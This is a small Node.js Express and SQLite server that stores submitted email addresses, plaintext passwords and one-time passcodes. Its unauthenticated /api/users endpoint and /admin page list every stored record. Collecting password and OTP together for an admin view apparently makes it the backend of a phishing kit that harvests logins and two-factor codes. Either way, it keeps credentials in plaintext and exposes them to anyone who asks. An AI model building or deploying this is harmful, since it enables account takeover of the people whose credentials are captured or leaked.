const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const app = express();
const port = 3000;

// Initialize SQLite database
const db = new sqlite3.Database('./database.sqlite');

// Create users table if it doesn't exist
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE,
    password TEXT,
    otp TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Middleware
app.use(express.json());
app.use(express.static('public'));

// API endpoint to get all users
app.get('/api/users', (req, res) => {
  db.all('SELECT * FROM users ORDER BY created_at DESC', [], (err, rows) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    res.json(rows);
  });
});

// API endpoint to add a new user
app.post('/api/users', (req, res) => {
  const { email, password, otp } = req.body;
  
  db.run('INSERT INTO users (email, password, otp) VALUES (?, ?, ?)', 
    [email, password, otp], 
    function(err) {
      if (err) {
        res.status(400).json({ error: err.message });
        return;
      }
      res.json({ id: this.lastID });
  });
});

// Serve the admin page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
